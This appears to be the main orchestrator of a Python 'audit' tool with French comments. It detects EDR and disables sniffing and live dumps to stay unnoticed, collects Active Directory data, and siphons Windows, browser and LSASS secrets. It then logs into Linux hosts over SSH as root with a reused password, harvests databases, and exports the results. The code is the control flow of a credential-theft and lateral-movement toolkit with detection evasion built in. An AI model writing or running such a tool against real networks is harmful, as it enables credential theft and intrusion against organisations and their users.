import time
import json
from modules.detector import EnvironmentDetector
from modules.siphon import Siphon
from collectors.ad_collector import ADCollector
from collectors.linux_collector import LinuxCollector
from collectors.db_collector import DBCollector
from utils.export import DataExporter

class Orchestrator:
    def __init__(self, config):
        self.config = config
        self.detector = EnvironmentDetector(config)
        self.siphon = Siphon(config)
        self.exporter = DataExporter(config)
        self.results = {}

    def run(self):
        print("[*] Démarrage Audit Engine")

        # 1. Détection
        env = self.detector.scan()
        print(f"[+] OS: {env['os']} | EDR: {env['edr_detected']}")

        if env['edr_detected'] and self.config.mode == "prod":
            self.config.sniff_enabled = False
            self.config.dump_live_enabled = False

        # 2. Collecte Active Directory
        print("[+] Collecte AD...")
        self.results['ad'] = ADCollector(self.config).collect()

        # 3. Siphon (Windows + Navigateurs + LSASS + Sniff)
        print("[+] Siphon...")
        self.results['secrets'] = self.siphon.run()

        # 4. 🟢 COLLECTE LINUX (maintenant activée)
        if hasattr(self.config, 'linux_hosts') and self.config.linux_hosts:
            print("[+] Collecte Linux (SSH)...")
            linux_results = []
            linux = LinuxCollector(self.config)
            for host in self.config.linux_hosts:
                try:
                    print(f"    Connexion à {host}...")
                    # Utilise le même mot de passe (ou adapte selon ta config)
                    res = linux.collect(host, 'root', password=self.config.password)
                    linux_results.append({host: res})
                except Exception as e:
                    linux_results.append({host: {"error": str(e)}})
            self.results['linux'] = linux_results

        # 5. 🟢 COLLECTE BASES DE DONNEES (maintenant activée)
        if hasattr(self.config, 'db_configs') and self.config.db_configs:
            print("[+] Collecte Bases de Données...")
            db_results = []
            db = DBCollector(self.config)
            for conf in self.config.db_configs:
                try:
                    print(f"    Connexion à {conf['host']} ({conf['type']})...")
                    res = db.collect(
                        conf['type'],
                        conf['host'],
                        conf['user'],
                        conf['password'],
                        conf['dbname']
                    )
                    db_results.append({conf['host']: res})
                except Exception as e:
                    db_results.append({conf['host']: {"error": str(e)}})
            self.results['databases'] = db_results

        # 6. Export final
        print("[+] Export...")
        self.exporter.export(self.results)

        print(f"[+] Terminé. Fichier: {self.config.output}")